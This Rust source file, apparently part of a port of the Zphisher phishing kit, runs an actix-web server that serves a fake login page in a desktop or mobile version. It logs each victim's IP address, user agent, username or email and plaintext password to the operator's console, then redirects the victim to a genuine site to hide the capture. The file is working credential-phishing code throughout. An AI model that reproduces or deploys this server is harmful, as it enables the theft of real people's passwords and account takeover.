use std::path::PathBuf;
use actix_files::NamedFile;
use actix_web::{get, post, middleware, http, web, App, HttpRequest, HttpResponse, HttpServer, Responder};
use crate::cli::{clear_terminal, error_msg};
use actix_cors::Cors;
use actix_web::http::header;
use actix_web::http::header::HeaderValue;
use actix_web::web::{Data, Form};
use colored::Colorize;
use crate::constants::{HOST, PORT};
use crate::zphisher::banner_small;
use serde::Deserialize;


#[get("/")]
async fn index(req: HttpRequest, data: Data<PathBuf>) -> impl Responder {
    let client_ip = req.connection_info().peer_addr().unwrap_or("<unknown>").to_string();
    let user_agent = match req.headers().get(header::USER_AGENT) {
        Some(user_agent) => match user_agent.to_str() {
            Ok(user_agent) => user_agent,
            Err(err) => {
                error_msg(&err.to_string());
                std::process::exit(1);
            }
        },
        None => "",
    };
    println!("Client IP: {}", client_ip);
    println!("User Agent: {}", user_agent);

    let user_agent = match req.headers().get(header::USER_AGENT) {
        Some(user_agent) => match user_agent.to_str() {
            Ok(user_agent) => user_agent,
            Err(err) => {
                error_msg(&err.to_string());
                std::process::exit(1);
            }
        },
        None => "",
    };


    let file_name = if is_mobile(user_agent) {
        if !data.get_ref().join("mobile.html").exists() {
            "login.html"
        } else {
            "mobile.html"
        }
    } else { "login.html" };

    let file_path = data.get_ref().join(file_name);
    let file = match NamedFile::open(file_path) {
        Ok(file) => file,
        Err(err) => {
            error_msg(&err.to_string());
            std::process::exit(1);
        }
    };
    let mut response = file.into_response(&req);
    response.headers_mut().insert(
        header::CONTENT_TYPE,
        HeaderValue::from_static("text/html"),
    );
    response.headers_mut().insert(
        header::CACHE_CONTROL,
        HeaderValue::from_static("no-store"),
    );
    response
}


#[derive(Debug, Deserialize)]
pub struct LoginForm {
    username: Option<String>,
    email: Option<String>,
    password: String,
}

pub struct Config {
    pub redirect_url: String,
}

#[post("/login")]
async fn login(
    req: HttpRequest,
    form: Form<LoginForm>,
    config: Data<Config>,
) -> impl Responder {
    let client_ip = req.connection_info().peer_addr().unwrap_or("<unknown>").to_string();
    let user_agent = match req.headers().get(header::USER_AGENT) {
        Some(user_agent) => match user_agent.to_str() {
            Ok(user_agent) => user_agent,
            Err(err) => {
                error_msg(&err.to_string());
                std::process::exit(1);
            }
        },
        None => "",
    };
    println!("Client IP: {}", client_ip);
    println!("User Agent: {}", user_agent);
    if let Some(username) = &form.username {
        println!("Username: {}", username);
    } else if let Some(email) = &form.email {
        println!("Email: {}", email);
    }
    println!("Password: {}", form.password);

    HttpResponse::Found().append_header(("Location", config.redirect_url.as_str())).finish()
}

async fn not_found() -> HttpResponse {
    HttpResponse::Found().append_header(("Location", "/")).finish()
}

#[get("/favicon.{ext}")]
async fn favicon(ext: web::Path<String>, data: Data<PathBuf>, req: HttpRequest) -> Result<HttpResponse, actix_web::Error> {
    let favicon_path = data.get_ref().join(format!("favicon.{}", ext.into_inner()));
    let file = match NamedFile::open(favicon_path) {
        Ok(file) => file,
        Err(_) => return Ok(HttpResponse::new(http::StatusCode::NOT_FOUND)),
    };
    let mut response = file.into_response(&req);
    response.headers_mut().insert(
        header::CACHE_CONTROL,
        HeaderValue::from_static("no-store"),
    );
    Ok(response)
}


fn is_mobile(user_agent: &str) -> bool {
    user_agent.contains("Mobile") || user_agent.contains("Android") || user_agent.contains("iPhone")
}

pub async fn start_webserver(static_files: PathBuf, port: Option<u16>, redirect_url: String) -> std::io::Result<()> {
    match clear_terminal() {
        Ok(_) => {}
        Err(err) => {
            error_msg(&err.to_string());
            std::process::exit(1);
        }
    }
    banner_small();
    println!("{} {}", "Successfully started server at".green(), format!("http://{0}:{1}", HOST, PORT).cyan());
    HttpServer::new(move || {
        App::new().wrap(middleware::Compress::default()).wrap(
            Cors::default().allow_any_origin().allow_any_method().allow_any_header()
        )
            .service(index)
            .service(favicon)
            .service(login)
            .default_service(web::route().to(not_found))
            .service(actix_files::Files::new("/", static_files.clone()))
            .app_data(Data::new(static_files.clone())).app_data(Data::new(Config {
            redirect_url: redirect_url.clone()
        }))
    }).bind(("127.0.0.1", {
        match port {
            Some(port) => port,
            None => PORT
        }
    }))?.run().await
}

